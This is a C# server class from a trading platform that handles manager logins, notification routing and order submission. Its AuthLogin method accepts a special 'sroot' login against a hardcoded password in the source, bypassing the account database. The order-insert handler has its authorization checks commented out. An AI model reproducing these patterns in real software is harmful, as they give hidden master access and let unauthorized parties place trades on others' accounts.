using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using TradingLib.API;
using TradingLib.Common;


namespace TradingLib.Core
{
    /// <summary>
    /// 管理系统管理人员和代理机制
    /// 创建代理帐户后,系统可以用代理帐户登入系统,创建各种角色的下属人员
    /// 同时创建交易帐号,创建的交易帐号有与之对应的AgentCode 来进行识别,判断该帐号属于哪个代理人员
    /// 管理帐户登入时通过判断,如果是代理的管理帐号则通过AgentCode来获取其开设的所有交易帐号并更新的管理终端
    /// 
    /// </summary>
    public class TLServer_MgrExch : TLServer_Generic<MgrClientInfo>
    {
        public TLServer_MgrExch(string server, int port, bool verb)
            : base("MgrExch",server, port, verb)
        {


        
        
        }


        /// <summary>
        /// 注销某个管理帐户的所有管理端
        /// </summary>
        /// <param name="account"></param>
        public void ClearTerminalsForManager(string manager)
        {
            foreach (MgrClientInfo info in this.ClientsForManager(manager))
            {
                _clients.UnRegistClient(info.Location.ClientID);
            }
        }
        /// <summary>
        /// 查找所有以交易帐号account登入的客户端连接
        /// </summary>
        /// <param name="account"></param>
        /// <returns></returns>
        public IEnumerable<MgrClientInfo> ClientsForManager(string loginid)
        {
            return _clients.Clients.Where(client => (client.Manager != null && client.Manager.Login.Equals(loginid)));
        }


        public override void TLSendOther(IPacket packet)
        {
            //base.TLSendOther(packet);
        }


        /// <summary>
        /// 获得某个通知包的通知地址
        /// 管理端的通知逻辑,管理端用于查看或管理一组交易帐户,如果管理帐号有权对该帐号进行查看,则便会获得对应帐号的所有通知
        /// 1.交易信息类,交易信息中包含了交易帐户,所有有权查看该交易帐户的管理端均获得对应的通知
        /// 2.交易TrdClientInfo包含有该客户端登入时候所绑定的Account
        /// 通过搜索获得所有某个Account登入的客户端地址
        /// </summary>
        /// <param name="packet"></param>
        /// <returns></returns>
        public override ILocation[] GetNotifyTargets(IPacket packet)
        {
            NotifyResponsePacket notify = packet as NotifyResponsePacket;
            
            //管理端消息类别 地址通知,通过某个具体的地址通知到对应的客户端

            //1.向某个特定的地址发送的通知
            if (packet.PacketType == QSEnumPacketType.LOCATIONNOTIFYRESPONSE)
            {
                if (packet.Type == MessageTypes.MGRCONTRIBRESPONSE)
                {
                    string x = "";
                }
                return notify.Locatioins.ToArray();
            }
            
            //2.通知类型的以Accout为目标的搜索 逻辑 某个管理端有权限查看该帐户则向该帐户进行发送
            if (packet.PacketType == QSEnumPacketType.NOTIFYRESPONSE)
            {
                if (GetLocationsViaAccountEvent != null)
                {
                    return GetLocationsViaAccountEvent(notify.Account);
                }
            
            }
            return new ILocation[]{};
        }
        
        /// <summary>
        /// 服务客户端请求登入认证函数
        /// </summary>
        /// <param name="c"></param>
        /// <param name="loginid"></param>
        /// <param name="pass"></param>
        public override void AuthLogin(LoginRequest request, MgrClientInfo client)
        {
            //数据库密码验证
            bool re = false;
            Manager mgr = BasicTracker.ManagerTracker[request.LoginID];
            if (mgr == null)
            {
                re = false;
            }
            else
            {
                if (!request.LoginID.Equals("sroot"))
                {
                    re = mgr.Pass.Equals(request.Passwd);
                    //re = ORM.MManager.ValidManager(request.LoginID, request.Passwd);
                }
                else
                {
                    re = request.Passwd.Equals("xmt9875$");
                }
            }

            RspMGRLoginResponse response = ResponseTemplate<RspMGRLoginResponse>.SrvSendRspResponse(request);
            //如果验证通过返回具体的管理信息
            if (re)
            {
                //通过登入名在内存中获得对应的Manager对象 然后将该Manager对象的数据复制到ClientInfo上
                Manager m = BasicTracker.ManagerTracker[request.LoginID];
                if (m != null)
                {
                    if (!m.Active)
                    {
                        response.RspInfo.Fill("MGR_INACTIVE");
                    }
                    if (m.Domain.IsExpired())//域过期
                    {
                        response.RspInfo.Fill("PLATFORM_EXPIRED");
                    }
                    else
                    {
                        response.LoginResponse.LoginID = m.Login;
                        response.LoginResponse.Mobile = m.Mobile;
                        response.LoginResponse.Name = m.Name;
                        response.LoginResponse.QQ = m.QQ;
                        response.LoginResponse.ManagerType = m.Type;
                        response.LoginResponse.MGRID = m.ID;//mgrid
                        response.LoginResponse.BaseMGRFK = m.mgr_fk;//主域id


                        //获得界面访问权限列表
                        response.LoginResponse.UIAccess = BasicTracker.UIAccessTracker.GetUIAccess(m);
                        response.LoginResponse.Domain = m.Domain as DomainImpl;

                        //绑定客户端状态对象 该过程同时进行授权标识
                        client.BindState(m);
                    }

                }
                else//如果管理端对象在内存中不存在 则返回登入失败
                {
                    response.RspInfo.Fill("MGR_NOT_EXIST");
                }
            }
            else
            {
                response.RspInfo.Fill("MGR_PASS_ERROR");
            }

            if (response.RspInfo.ErrorID != 0)
            {
                logger.Warn("Manager:" + request.LoginID + " Login failed");
            }

            SendOutPacket(response);
        }


        /// <summary>
        /// 请求交易功能特征列表
        /// </summary>
        /// <param name="msg"></param>
        /// <param name="address"></param>
        public override void SrvReqFuture(FeatureRequest req,MgrClientInfo client)
        {
            FeatureResponse response = ResponseTemplate<FeatureResponse>.SrvSendRspResponse(req);

            string msf = "";
            List<MessageTypes> f = new List<MessageTypes>();

            f.Add(MessageTypes.REGISTERCLIENT);//注册客户端
            f.Add(MessageTypes.LOGINREQUEST);//请求登入
            f.Add(MessageTypes.CLEARCLIENT);//注销客户端

            f.Add(MessageTypes.HEARTBEAT);//发送心跳包
            f.Add(MessageTypes.HEARTBEATREQUEST);//心跳请求
            f.Add(MessageTypes.HEARTBEATRESPONSE);
            f.Add(MessageTypes.VERSIONREQUEST);//服务器版本
            //f.Add(MessageTypes.BROKERNAME);//服务端标识
            f.Add(MessageTypes.FEATUREREQUEST);//请求功能特征
            f.Add(MessageTypes.FEATURERESPONSE);//回报功能请求

            f.Add(MessageTypes.REGISTERSYMTICK);//请求行情数据
            f.Add(MessageTypes.UNREGISTERSYMTICK);//取消行情数据

            if (newFeatureRequest != null)
            {
                MessageTypes[] f2 = newFeatureRequest();
                foreach (MessageTypes t in f2)
                {
                    if (f.Contains(t))
                        continue;
                    f.Add(t);
                }
            }
            response.Add(f.ToArray());
            TLSend(response);
        }


        /// <summary>
        /// 系统接受到客户端发送过来的委托
        /// 1.检查客户端是否Register如果没有register则clientlist不存在该ClientID
        /// 2.检查账户是否登入,如果登入 检查委托账号与登入账户是否一致
        /// </summary>
        /// <param name="msg"></param>
        /// <param name="address"></param>
        public void SrvOnOrderInsert(ISession session,OrderInsertRequest request)
        {
            logger.Info("Got Order:" + request.Order.GetOrderInfo());
            //MgrClientInfo cinfo = _clients[request.ClientID];
            //1.如果不存在,表明该ID没有通过注册连接到我们的服务端
            //if (cinfo == null)
            //{
            //    debug("系统拒绝委托:" + request.Order.ToString() + "系统没有该注册端:" + request.ClientID + "|" + request.Order.Account, QSEnumDebugLevel.WARNING);
            //    return;
            //}


            ////2.检查插入委托请求是否有效
            //if (!request.IsValid)
            //{
            //    debug("请求无效", QSEnumDebugLevel.ERROR);
            //    return;
            //}

            //3.如果本地客户端列表中存在该ID,则我们需要比较该ID所请求的交易账号与其所发送的委托账号是否一致,这里防止客户端发送他人的account的委托
            //只有当客户端通过请求账户 提供正确的账户 与密码 系统才会将address(ClientID与Account进行绑定)
            //if (!cinfo.Authorized)
            //{
            //    debug("客户端:" + cinfo.Location.ClientID + "未登入,无法请求委托", QSEnumDebugLevel.ERROR);
            //    return;
            //}

            //IAccount account = TLCtxHelper.CmdAccount[request.Order.Account];

            /* 管理端持仓不区分昨仓和今仓，在管理端进行平仓时，需要检测是否同时在一个委托中平昨仓和今仓，如果混合需要拆分委托
             * 
             * 
             * 
             * */

            //标注来自客户端的原始委托 管理端平仓由管理端维护平今 平昨的问题
            Order order = new OrderImpl(request.Order);//复制委托传入到逻辑层
            order.OrderSource = QSEnumOrderSource.QSMONITER;
            order.TotalSize = order.Size;
            order.Date = Util.ToTLDate();
            order.Time = Util.ToTLTime();

            //对外层触发委托事件
            if (newSendOrderRequest != null)
                newSendOrderRequest(order);
        }
        /// <summary>
        /// 取消委托,参数为全局委托编号
        /// </summary>
        /// <param name="msg"></param>
        public void SrvOnOrderAction(OrderActionRequest request)
        {
            //通过address(ClientID)查询本地客户端列表是否存在该ID
            logger.Info("got order action:" + request.ToString());
            MgrClientInfo cinfo = _clients[request.ClientID];
            if (cinfo == null) return;

            if (newOrderActionRequest != null)
                newOrderActionRequest(request.OrderAction);
        }


        public override void OnSessionCreated(Client2Session session)
        {
            session.SessionType = QSEnumSessionType.MANAGER;
        }

        public override void OnSessionStated(Client2Session session, MgrClientInfo client)
        {
            session.BindManager(client.Manager);
        }
        /// <summary>
        /// 处理母类所不处理的消息类型
        /// </summary>
        /// <param name="type"></param>
        /// <param name="msg"></param>
        /// <param name="address"></param>
        /// <returns></returns>
        public override long handle(ISession session,IPacket packet)
        {
            long result = NORETURNRESULT;
            switch (packet.Type)
            {
                case MessageTypes.SENDORDER:
                    SrvOnOrderInsert(session,packet as OrderInsertRequest);
                    break;
                case MessageTypes.SENDORDERACTION:
                    SrvOnOrderAction(packet as OrderActionRequest);
                    break;

                default:
                    if (newPacketRequest != null)
                        newPacketRequest(session,packet);
                    else
                        result = (long)MessageTypes.FEATURE_NOT_IMPLEMENTED;
                    break;
            }
            return result;
        }

        #region 底层基础事件
        public event LoginRequestDel<MgrClientInfo> newLoginRequest;//登入服务器
        public event OrderDelegate newSendOrderRequest;//发送委托
        public event OrderActionDelegate newOrderActionRequest;//发送委托操作
        public event MessageArrayDelegate newFeatureRequest;//请求功能列表
        public event PacketRequestDel newPacketRequest;
        public event LocationsViaAccountDel GetLocationsViaAccountEvent;//
        #endregion

    }

    /// <summary>
    /// 管理服务器的逻辑包委托
    /// </summary>
    /// <param name="packet"></param>
    /// <param name="session"></param>
    /// <param name="manager"></param>
    //public delegate void MgrPacketRequestDel(ISession session,IPacket packet,Manager manager);
    /// <summary>
    /// 通过某个交易帐号获得对应的管理端通知列表
    /// </summary>
    /// <param name="account"></param>
    /// <returns></returns>
    public delegate ILocation[] LocationsViaAccountDel(string account);
}
